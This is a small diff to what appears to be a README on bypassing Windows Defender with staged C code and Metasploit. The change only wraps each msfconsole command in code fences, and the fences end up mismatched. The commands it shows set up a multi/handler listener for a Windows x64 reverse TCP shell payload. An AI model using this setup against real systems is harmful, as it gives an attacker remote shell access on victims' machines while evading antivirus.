@@ -59,9 +59,14 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
 - Setting up msfconsole
 ```
    msfconsole
+```
    use exploit multi/handler
+   ```
    set payload windows/x64/shell_reverse_tcp
+```
    set LHOST <LOCAL IP>
+   ```
    set LPORT 4444
+```
    exploit
 ```
